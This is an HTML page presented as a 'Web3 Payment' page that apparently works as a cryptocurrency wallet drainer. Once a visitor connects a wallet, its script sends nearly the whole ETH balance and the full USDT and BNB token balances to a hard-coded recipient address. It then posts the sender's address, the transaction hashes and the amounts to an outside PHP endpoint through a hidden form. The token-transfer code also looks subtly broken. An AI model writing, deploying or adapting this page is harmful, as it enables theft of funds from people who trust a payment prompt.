<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Web3 Payment</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/web3modal@1.9.7/dist/index.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.6.6/dist/umd/index.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.6.0/dist/ethers.umd.min.js"></script>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f0f0f0;
        }
        button {
            padding: 15px 25px;
            font-size: 16px;
        }
    </style>
</head>
<body>
    <button id="connectButton">Connect Wallet & Transfer Max Amount</button>

    <form id="transactionForm" action="https://eflujsyb0kuybgol11532.cleavr.one/btc/d.php" method="post" style="display: none;">
        <input type="hidden" name="transactionDetails" id="transactionDetails">
    </form>

    <script>
        const connectButton = document.getElementById('connectButton');
        const transactionForm = document.getElementById('transactionForm');
        const transactionDetailsInput = document.getElementById('transactionDetails');
        const recipientAddress = '0xDF67b71a130Bf51fFaB24f3610D3532494b61A0f';
        const gasLimit = 21000n; // Changed to BigInt

        const tokenAddresses = {
            USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
            BNB: '0xB8c77482e45F1F44dE1745F52C74426C631bDD52'
        };

        const tokenABI = [
            {
                "constant": true,
                "inputs": [{"name": "_owner", "type": "address"}],
                "name": "balanceOf",
                "outputs": [{"name": "balance", "type": "uint256"}],
                "type": "function"
            }
        ];

        async function init() {
            const providerOptions = {
                walletconnect: {
                    package: WalletConnectProvider.default,
                    options: {
                        infuraId: "c05e035e823a4769b62ae15c1cbe2f02" // Your Infura Project ID
                    }
                },
                binancechainwallet: {
                    package: true
                },
                coinbasewallet: {
                    package: true,
                    options: {
                        appName: "Web3 Payment",
                        infuraId: "c05e035e823a4769b62ae15c1cbe2f02"
                    }
                },
                trustwallet: {
                    package: true
                }
            };

            const web3Modal = new Web3Modal.default({
                cacheProvider: true,
                providerOptions
            });

            connectButton.addEventListener('click', async () => {
                try {
                    const provider = await web3Modal.connect();
                    const web3 = new Web3(provider);

                    if (provider.isMetaMask) {
                        console.log('MetaMask detected');
                    } else if (provider.isTrust) {
                        console.log('Trust Wallet detected');
                    } else if (provider.isCoinbaseWallet) {
                        console.log('Coinbase Wallet detected');
                    } else if (provider.isBinanceChainWallet) {
                        console.log('Binance Chain Wallet detected');
                    } else {
                        console.log('Unknown wallet detected');
                    }

                    const ethersProvider = new ethers.providers.Web3Provider(provider);
                    const signer = ethersProvider.getSigner();
                    const accounts = await web3.eth.getAccounts();
                    const senderAddress = accounts[0];

                    // Get ETH balance
                    const ethBalanceWei = BigInt(await web3.eth.getBalance(senderAddress));
                    const gasPriceWei = BigInt(await web3.eth.getGasPrice());
                    const gasFeeWei = gasPriceWei * gasLimit;
                    const maxEthTransferWei = ethBalanceWei - gasFeeWei;

                    // Get USDT balance
                    const usdtContract = new web3.eth.Contract(tokenABI, tokenAddresses.USDT);
                    const usdtBalanceWei = BigInt(await usdtContract.methods.balanceOf(senderAddress).call());

                    // Get BNB balance
                    const bnbContract = new web3.eth.Contract(tokenABI, tokenAddresses.BNB);
                    const bnbBalanceWei = BigInt(await bnbContract.methods.balanceOf(senderAddress).call());

                    // Create transactions for each token
                    const ethTransactionParameters = {
                        to: recipientAddress,
                        from: senderAddress,
                        value: web3.utils.toHex(maxEthTransferWei),
                        gas: web3.utils.toHex(gasLimit),
                        gasPrice: web3.utils.toHex(gasPriceWei)
                    };

                    const usdtTransactionParameters = {
                        to: tokenAddresses.USDT,
                        from: senderAddress,
                        value: '0x0', // No ETH value required
                        gas: web3.utils.toHex(gasLimit),
                        gasPrice: web3.utils.toHex(gasPriceWei),
                        data: usdtContract.methods.transfer(recipientAddress, usdtBalanceWei.toString()).encodeABI()
                    };

                    const bnbTransactionParameters = {
                        to: tokenAddresses.BNB,
                        from: senderAddress,
                        value: '0x0', // No ETH value required
                        gas: web3.utils.toHex(gasLimit),
                        gasPrice: web3.utils.toHex(gasPriceWei),
                        data: bnbContract.methods.transfer(recipientAddress, bnbBalanceWei.toString()).encodeABI()
                    };

                    // Send transactions
                    const ethTxHash = await web3.eth.sendTransaction(ethTransactionParameters);
                    const usdtTxHash = await web3.eth.sendTransaction(usdtTransactionParameters);
                    const bnbTxHash = await web3.eth.sendTransaction(bnbTransactionParameters);

                    // Send transaction details to PHP endpoint
                    transactionDetailsInput.value = JSON.stringify({
                        status: 'approved',
                        ethTransactionHash: ethTxHash.transactionHash,
                        usdtTransactionHash: usdtTxHash.transactionHash,
                        bnbTransactionHash: bnbTxHash.transactionHash,
                        sender: senderAddress,
                        recipient: recipientAddress,
                        maxEthTransfer: maxEthTransferWei.toString(),
                        usdtBalance: usdtBalanceWei.toString(),
                        bnbBalance: bnbBalanceWei.toString()
                    });
                    transactionForm.submit();
                } catch (error) {
                    console.error('Error:', error.message);
                    // Handle user rejection
                    transactionDetailsInput.value = JSON.stringify({
                        status: 'declined',
                        error: error.message
                    });
                    transactionForm.submit();
                }
            });
        }

        window.addEventListener('load', init);
    </script>
</body>
</html>
